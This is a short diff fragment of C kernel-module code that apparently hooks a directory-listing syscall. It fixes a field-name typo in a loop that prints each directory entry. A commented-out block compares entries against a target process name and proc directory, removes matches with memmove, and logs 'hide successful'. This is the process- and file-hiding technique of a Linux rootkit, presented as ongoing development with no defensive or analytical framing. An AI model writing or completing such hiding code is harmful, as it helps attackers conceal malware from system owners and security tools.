@@ -62,8 +62,8 @@ struct linux_dirent __user *dirp, unsigned int count){
   while(tlen > 0 ) {
     len = dirp->d_reclen;
     tlen -= len;
-    printk("%s\n", dirp->dname);
-    /*if( strcmp(dirp->dname, proc_dir) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
+    printk("%s\n", dirp->d_name);
+    /*if( strcmp(dirp->d_name, proc_dir) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
       memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
       printk(KERN_INFO "hide successful\n");
